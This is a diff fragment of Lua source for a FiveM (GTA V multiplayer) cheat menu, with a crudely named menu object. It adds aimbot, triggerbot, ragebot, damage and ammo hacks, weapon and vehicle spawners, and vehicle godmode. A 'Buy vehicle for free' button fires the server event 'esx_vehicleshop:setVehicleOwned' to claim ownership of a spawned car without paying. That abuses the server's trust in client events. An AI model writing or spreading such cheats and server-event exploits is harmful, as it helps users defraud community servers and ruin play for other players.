+                        SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currentIndex]-1, 0, 0)
+						faceTexturesList = GetHeadTextures(faceItemsList[currentIndex]-1)
+						end) then
+                    elseif IhadSexWithMyStepMother.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
+                        previousHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
+                        
+                        previousHairTextureDisplay = hairTextureList[currHairTextureIndex]
+
+                        currHairIndex = currentIndex
+                        selHairIndex = currentIndex
+                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currentIndex]-1, 0, 0)
+                        currentHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
+                        hairTextureList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))
+
+                        if (currentKey == keys.left or currentKey == keys.right) and previousHairTexture > currentHairTexture and previousHairTextureDisplay > currentHairTexture then
+                            currHairTextureIndex = hairTexturesList[currentHairTexture]
+                            selHairTextureIndex = hairTexturesList[currentHairTexture]
+                        end
+
+                        end) then
+                    elseif IhadSexWithMyStepMother.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
+                        currHairTextureIndex = currentIndex
+                        selHairTextureIndex = currentIndex
+                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currHairIndex]-1, currentIndex-1, 0)
+                        end) then
+                    elseif IhadSexWithMyStepMother.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
+                        currMaskIndex = currentIndex
+                        selMaskIndex = currentIndex
+                        SetPedComponentVariation(PlayerPedId(), 1, maskItemsList[currentIndex]-1, 0, 0)
+						end) then
+                    elseif IhadSexWithMyStepMother.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
+                        previousHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props before the hat index and the prop updates (previous)
+
+                        -- I wanted to grab hatTexturesList[currHatTextureIndex] before the the Prop was updated. This value is the number (index) that is shown on the Hat Texture ComboBox before it updates
+                        previousHatTextureDisplay = hatTexturesList[currHatTextureIndex]
+
+                        -- Both Hat Slider and Hat Texture ComboBox values update
+                        currHatIndex = currentIndex
+                        selHatIndex = currentIndex
+                        SetPedPropIndex(PlayerPedId(), 0, hatItemsList[currentIndex]-1, 0, 0)
+                        currentHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props after the hat index and the prop updates (current)
+                        hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0)) -- Generates our array of indexes
+
+                        -- This if condition will only run once for every hat change since the variables previousHatTexture and currentHatTexture will become the same after the SetPedPropIndex() function runs
+                        if (currentKey == keys.left or currentKey == keys.right) and previousHatTexture > currentHatTexture and previousHatTextureDisplay > currentHatTexture then 
+                            print('if condition')
+                            -- Checking if the left/right arrow key was pressed since this function runs every tick, to make sure it really only runs once
+                            
+                            -- Sets the current Index of the HatTexturesList to the max value of the currentHatTexture
+                            currHatTextureIndex = hatTexturesList[currentHatTexture]
+                            selHatTextureIndex = hatTexturesList[currentHatTexture]
+                        end
+
+						end) then	
+					elseif IhadSexWithMyStepMother.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
+                        currHatTextureIndex = currentIndex
+                        selHatTextureIndex = currentIndex
+                        SetPedPropIndex(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0), currentIndex, 0)
+						end) then
+						
+                    end
+					
+					
+				elseif IhadSexWithMyStepMother.IsMenuOpened('WeaponCustomization') then
+                    if IhadSexWithMyStepMother.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
+                    currPFuncIndex = currentIndex
+                    selPFuncIndex = currentIndex
+					  end) then
+                    if selPFuncIndex == 1 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
+                 
+                    elseif selPFuncIndex == 2 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
+                    
+                    elseif selPFuncIndex == 3 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
+                    
+                    elseif selPFuncIndex == 4 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
+                    
+                    elseif selPFuncIndex == 5 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
+                    
+                    elseif selPFuncIndex == 6 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
+                    
+                    elseif selPFuncIndex == 7 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
+                    
+                    elseif selPFuncIndex == 8 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
+                    end
+                elseif IhadSexWithMyStepMother.Button("~g~Add ~s~Special Finish") then
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
+                elseif IhadSexWithMyStepMother.Button("~r~Remove ~s~Special Finish") then
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
+                elseif IhadSexWithMyStepMother.Button("~g~Add ~s~Suppressor") then
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
+                elseif IhadSexWithMyStepMother.Button("~r~Remove ~s~Suppressor") then
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
+                elseif IhadSexWithMyStepMother.Button("~g~Add ~s~Scope") then
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
+                elseif IhadSexWithMyStepMother.Button("~r~Remove ~s~Scope") then
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
+                end
+			
+
+        -- WEAPON OPTIONS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('weapon') then
+            if IhadSexWithMyStepMother.MenuButton("Give ~s~Single Weapon", 'weaponspawner') then
+                selectedPlayer = PlayerId()
+			elseif IhadSexWithMyStepMother.MenuButton("Weapon Customization", "WeaponCustomization") then
+                selectedPlayer = PlayerId()
+            elseif IhadSexWithMyStepMother.Button("Give All Weapons") then
+                GiveAllWeapons(PlayerId())
+            elseif IhadSexWithMyStepMother.Button("Remove All Weapons") then
+                StripPlayer(PlayerId())
+			elseif IhadSexWithMyStepMother.Button("Remove Ammo") then
+                SetPedAmmo(GetPlayerPed(-1), 0)
+            elseif IhadSexWithMyStepMother.Button("Give Max Ammo") then
+                GiveMaxAmmo(PlayerId())
+            elseif IhadSexWithMyStepMother.CheckBox("Infinite Ammo", InfAmmo) then
+                InfAmmo = not InfAmmo
+                SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
+            elseif IhadSexWithMyStepMother.CheckBox("Explosive Ammo", ExplosiveAmmo) then
+                ExplosiveAmmo = not ExplosiveAmmo
+            elseif IhadSexWithMyStepMother.CheckBox("Force Gun", ForceGun) then
+                ForceGun = not ForceGun
+            elseif IhadSexWithMyStepMother.CheckBox("Super Damage", SuperDamage) then
+                SuperDamage = not SuperDamage
+                if SuperDamage then
+                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
+                    SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
                 else
-                    FM:AddNotification("ERROR", "Failed to get dynamic trigger " .. dat.Trigger, 20000)
-                    FM:Print("[Dynamic Triggers] ^1Failed ^7to get trigger ^6" .. dat.Trigger .. "^7")
+                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
+                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                 end
+            elseif IhadSexWithMyStepMother.CheckBox("Rapid Fire", RapidFire) then
+                RapidFire = not RapidFire
+            elseif IhadSexWithMyStepMother.CheckBox("Aimbot", Aimbot) then
+                Aimbot = not Aimbot
+            elseif IhadSexWithMyStepMother.ComboBox("Aimbot Bone Target ~y~-->", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
+                currAimbotBoneIndex = currentIndex
+                selAimbotBoneIndex = currentIndex
+                AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
+            end) then
+                elseif IhadSexWithMyStepMother.CheckBox("Draw Aimbot FOV", DrawFov) then
+                DrawFov = not DrawFov
+                elseif IhadSexWithMyStepMother.CheckBox("Triggerbot", Triggerbot) then
+                    Triggerbot = not Triggerbot
+                elseif IhadSexWithMyStepMother.CheckBox("Ragebot", Ragebot) then
+                    Ragebot = not Ragebot
+                end
+        
+        
+        -- SPECIFIC WEAPON MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('weaponspawner') then
+            if IhadSexWithMyStepMother.MenuButton('Melee Weapons', 'melee') then
+            elseif IhadSexWithMyStepMother.MenuButton('Pistols', 'pistol') then
+            elseif IhadSexWithMyStepMother.MenuButton('SMGs / MGs', 'smg') then
+            elseif IhadSexWithMyStepMother.MenuButton('Shotguns', 'shotgun') then
+            elseif IhadSexWithMyStepMother.MenuButton('Assault Rifles', 'assault') then
+            elseif IhadSexWithMyStepMother.MenuButton('Sniper Rifles', 'sniper') then
+            elseif IhadSexWithMyStepMother.MenuButton('Thrown Weapons', 'thrown') then
+            elseif IhadSexWithMyStepMother.MenuButton('Heavy Weapons', 'heavy') then
+			end
+        
+        -- MELEE WEAPON MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('melee') then
+            for i = 1, #meleeweapons do
+                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..meleeweapons[i][2].."") then
+                    GiveWeapon(selectedPlayer, meleeweapons[i][1])
+                end
+            end
+        -- PISTOL MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('pistol') then
+			for i = 1, #pistolweapons do
+                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..pistolweapons[i][2].."") then
+                    GiveWeapon(selectedPlayer, pistolweapons[i][1])
+				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
+					SetPedAmmo(GetPlayerPed(-1), GetHashKey(pistolweapons[i][1]), 0)
+                end
+            end
+        -- SMG MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('smg') then
+            for i = 1, #smgweapons do
+                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..smgweapons[i][2].."") then
+                    GiveWeapon(selectedPlayer, smgweapons[i][1])
+				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
+					SetPedAmmo(GetPlayerPed(-1), GetHashKey(smgweapons[i][1]), 0)
+                end
+            end
+        -- SHOTGUN MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('shotgun') then
+            for i = 1, #shotgunweapons do
+                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..shotgunweapons[i][2].."") then
+                    GiveWeapon(selectedPlayer, shotgunweapons[i][1])
+					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
+					SetPedAmmo(GetPlayerPed(-1), GetHashKey(shotgunweapons[i][1]), 0)
+                end
+            end
+        -- ASSAULT RIFLE MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('assault') then
+            for i = 1, #assaultweapons do
+                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..assaultweapons[i][2].."") then
+                    GiveWeapon(selectedPlayer, assaultweapons[i][1])
+					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
+					SetPedAmmo(GetPlayerPed(-1), GetHashKey(assaultweapons[i][1]), 0)
+                end
+            end
+        -- SNIPER MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('sniper') then
+            for i = 1, #sniperweapons do
+                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..sniperweapons[i][2].."") then
+                    GiveWeapon(selectedPlayer, sniperweapons[i][1])
+					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
+					SetPedAmmo(GetPlayerPed(-1), GetHashKey(sniperweapons[i][1]), 0)
+                end
+            end
+        -- THROWN WEAPON MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('thrown') then
+            for i = 1, #thrownweapons do
+                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..thrownweapons[i][2].."") then
+                    GiveWeapon(selectedPlayer, thrownweapons[i][1])
+					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
+					SetPedAmmo(GetPlayerPed(-1), GetHashKey(thrownweapons[i][1]), 0)
+                end
+            end
+        -- HEAVY WEAPON MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('heavy') then
+            for i = 1, #heavyweapons do
+                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..heavyweapons[i][2].."") then
+                    GiveWeapon(selectedPlayer, heavyweapons[i][1])
+					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
+					SetPedAmmo(GetPlayerPed(-1), GetHashKey(heavyweapons[i][1]), 0)
+                end
+            end
+        
+        
+        -- VEHICLE OPTIONS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vehicle') then
+            if IhadSexWithMyStepMother.MenuButton("Vehicle Spawner 🚘", 'vehiclespawner') then
+                elseif IhadSexWithMyStepMother.MenuButton("Vehicle Mods", 'vehiclemods') then
+                elseif IhadSexWithMyStepMother.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
+				elseif IhadSexWithMyStepMother.MenuButton("Vehicle ~r~Boost", "VehBoostMenu") then
+                elseif IhadSexWithMyStepMother.MenuButton("Vehicle Godmode", VehGodmode) then
+                    VehGodmode = not VehGodmode
+				elseif IhadSexWithMyStepMother.ComboBox("Vehicle Functions ~r~-->", {"🔧 Repair Vehicle", "Clean Vehicle", "Dirty Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
+                    currVFuncIndex = currentIndex
+                    selVFuncIndex = currentIndex
+                    end) then
+					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
+					RequestControlOnce(veh)
+					if selVFuncIndex == 1 then
+						FixVeh(veh)
+						SetVehicleEngineOn(veh, 1, 1)
+					elseif selVFuncIndex == 2 then
+						SetVehicleDirtLevel(veh, 0)
+					elseif selVFuncIndex == 3 then
+						SetVehicleDirtLevel(veh, 15.0)
+					end
+				elseif IhadSexWithMyStepMother.Button("Drive to waypoint ~g~AUTO") then
+                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
+                        local blipIterator = GetBlipInfoIdIterator(8)
+                        local blip = GetFirstBlipInfoId(8, blipIterator)
+                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
+                        local ped = GetPlayerPed(-1)
+                        ClearPedTasks(ped)
+                        local v = GetVehiclePedIsIn(ped, false)
+                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, true)
+                        SetDriveTaskDrivingStyle(ped, 2883621)
+                        speedmit = true
+                    end
+				elseif IhadSexWithMyStepMother.Button("~r~Stop ~s~Drive AUTO") then
+                    speedmit = false
+                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
+                        ClearPedTasks(GetPlayerPed(-1))
+                    else
+                        ClearPedTasksImmediately(GetPlayerPed(-1))
+				    end
+			
+				elseif IhadSexWithMyStepMother.Button("Buy vehicle for free ~r~(risk)") then
+				local cb = GetKeyboardInput('Enter Vehicle Spawn Name', '', 100)
+				local cw = GetKeyboardInput('Enter Vehicle Licence Plate', '', 100)
+				if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
+				RequestModel(cb)
+				while not HasModelLoaded(cb) do
+				Citizen.Wait(0)
+				end
+				local veh =
+				CreateVehicle(
+				GetHashKey(cb),
+				GetEntityCoords(PlayerPedId(-1)),
+				GetEntityHeading(PlayerPedId(-1)),
+				true,
+				true
+					)
+					SetVehicleNumberPlateText(veh, cw)
+					local cx = ESX.Game.GetVehicleProperties(veh)
+					TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
+					ShowInfo('~g~~h~Success', false)
+				else
+					ShowInfo('~b~~h~Model is not valid!', true)
+    end
+				elseif IhadSexWithMyStepMother.CheckBox("Drift", driftMode) then
+                    driftMode = not driftMode
+                elseif IhadSexWithMyStepMother.CheckBox("Collision", Collision) then
+                    Collision = not Collision
+                elseif IhadSexWithMyStepMother.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
+                    currSpeedIndex = currentIndex
+                    selSpeedIndex = currentIndex
+                    SpeedModAmt = SpeedModOps[currSpeedIndex]
+                    
+                    if SpeedModAmt == 1.0 then
+                        SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt)
+                    else
+                        SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt * 20.0)
+                    end
+                end) then
+                    elseif IhadSexWithMyStepMother.CheckBox("Easy Handling / Stick To Floor", EasyHandling) then
+                    EasyHandling = not EasyHandling
+                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
+                    if not EasyHandling then
+                        SetVehicleGravityAmount(veh, 9.8)
+                    else
+                        SetVehicleGravityAmount(veh, 30.0)
+                    end
+                    elseif IhadSexWithMyStepMother.CheckBox("Deadly Bulldozer", DeadlyBulldozer) then
+                        DeadlyBulldozer = not DeadlyBulldozer
+                        if DeadlyBulldozer then
+                            local veh = SpawnVeh("BULLDOZER", 1, SpawnEngineOn)
+                            SetVehicleCanBreak(veh, not DeadlyBulldozer)
+                            SetVehicleCanBeVisiblyDamaged(veh, not DeadlyBulldozer)
+                            SetVehicleEnginePowerMultiplier(veh, 2500.0)
+                            SetVehicleEngineTorqueMultiplier(veh, 2500.0)
+                            SetVehicleEngineOn(veh, 1, 1, 1)
+                            SetVehicleGravityAmount(veh, 50.0)
+                            SetVehicleColours(veh, 27, 27)
+                            ShowInfo("~r~Go forth and devour thy enemies!\nPress E ~r~to launch a minion!")
+                        elseif not DeadlyBulldozer and IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
+                            DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
+                        end
+                    end
+        
+        -- VEHICLE SPAWNER MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclespawner') then
+            if IhadSexWithMyStepMother.Button("Spawn Vehicle By Name") then
+                local model = GetKeyboardInput("Enter Model Name:")
+                SpawnVeh(model, PlaceSelf, SpawnEngineOn)
+            elseif IhadSexWithMyStepMother.CheckBox("Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
+                PlaceSelf = not PlaceSelf			
+            elseif IhadSexWithMyStepMother.CheckBox("Spawn Planes In Air", SpawnInAir, "No", "Yes") then
+                SpawnInAir = not SpawnInAir
+            elseif IhadSexWithMyStepMother.CheckBox("Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
+                SpawnEngineOn = not SpawnEngineOn
+            elseif IhadSexWithMyStepMother.MenuButton('Compacts', 'compacts') then
+            elseif IhadSexWithMyStepMother.MenuButton('Sedans', 'sedans') then
+            elseif IhadSexWithMyStepMother.MenuButton('SUVs', 'suvs') then
+            elseif IhadSexWithMyStepMother.MenuButton('Coupes', 'coupes') then
+            elseif IhadSexWithMyStepMother.MenuButton('Muscle', 'muscle') then
+            elseif IhadSexWithMyStepMother.MenuButton('Sports Classics', 'sportsclassics') then
+            elseif IhadSexWithMyStepMother.MenuButton('Sports', 'sports') then
+            elseif IhadSexWithMyStepMother.MenuButton('Super', 'super') then
+            elseif IhadSexWithMyStepMother.MenuButton('~v~WWBA Vehicle', 'wwba') then
+            elseif IhadSexWithMyStepMother.MenuButton('Off-Road', 'offroad') then
+            elseif IhadSexWithMyStepMother.MenuButton('Industrial', 'industrial') then
+            elseif IhadSexWithMyStepMother.MenuButton('Utility', 'utility') then
+            elseif IhadSexWithMyStepMother.MenuButton('Vans', 'vans') then
+			elseif IhadSexWithMyStepMother.MenuButton('Cycles', 'cycles') then
+			elseif IhadSexWithMyStepMother.MenuButton('Boats', 'boats') then
+			elseif IhadSexWithMyStepMother.MenuButton('Helicopters', 'helicopters') then
+			elseif IhadSexWithMyStepMother.MenuButton('Planes', 'planes') then
+			elseif IhadSexWithMyStepMother.MenuButton('Service/Emergency/Military', 'service') then
+			elseif IhadSexWithMyStepMother.MenuButton('Commercial/Trains', 'commercial') then
+			end
+        
+        -- COMPACTS SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('compacts') then
+            for i = 1, #compacts do
+                local vehname = GetLabelText(compacts[i])
+                if vehname == "NULL" then vehname = compacts[i] end -- Avoid getting NULL (for some reason GetLabelText returns null for some vehs)
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(compacts[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- SEDANS SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('sedans') then
+            for i = 1, #sedans do
+                local vehname = GetLabelText(sedans[i])
+                if vehname == "NULL" then vehname = sedans[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(sedans[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- SUVs SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('suvs') then
+            for i = 1, #suvs do
+                local vehname = GetLabelText(suvs[i])
+                if vehname == "NULL" then vehname = suvs[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(suvs[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- COUPES SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('coupes') then
+            for i = 1, #coupes do
+                local vehname = GetLabelText(coupes[i])
+                if vehname == "NULL" then vehname = coupes[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(coupes[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- MUSCLE SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('muscle') then
+            for i = 1, #muscle do
+                local vehname = GetLabelText(muscle[i])
+                if vehname == "NULL" then vehname = muscle[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(muscle[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- SPORTSCLASSICS SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('sportsclassics') then
+            for i = 1, #sportsclassics do
+                local vehname = GetLabelText(sportsclassics[i])
+                if vehname == "NULL" then vehname = sportsclassics[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(sportsclassics[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- SPORTS SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('sports') then
+            for i = 1, #sports do
+                local vehname = GetLabelText(sports[i])
+                if vehname == "NULL" then vehname = sports[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(sports[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- SUPER SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('super') then
+            for i = 1, #super do
+                local vehname = GetLabelText(super[i])
+                if vehname == "NULL" then vehname = super[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(super[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- WWBA SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('WWBA') then
+            for i = 1, #WWBA do
+                local vehname = GetLabelText(WWBA[i])
+                if vehname == "NULL" then vehname = WWBA[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(WWBA[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- OFFROAD SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('offroad') then
+            for i = 1, #offroad do
+                local vehname = GetLabelText(offroad[i])
+                if vehname == "NULL" then vehname = offroad[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
